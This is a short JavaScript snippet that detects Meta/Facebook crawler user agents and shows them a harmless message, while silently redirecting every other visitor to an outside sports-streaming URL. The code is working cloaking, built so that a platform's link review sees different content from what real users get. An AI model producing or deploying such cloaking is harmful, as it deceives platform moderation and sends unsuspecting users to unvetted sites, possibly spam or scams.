const metaBotTokens = [
  "facebookexternalhit",
  "facebot",
  "meta-externalagent",
  "meta-externalfetcher",
];

const ua = navigator.userAgent.toLowerCase();
const isMetaBot = metaBotTokens.some(token => ua.includes(token));

if (isMetaBot) {
  console.log("Thanks for visiting my page");
} else {
  window.location.replace(
    "https://www.ajkerkhela.live/web/efl-championship"
  );
}
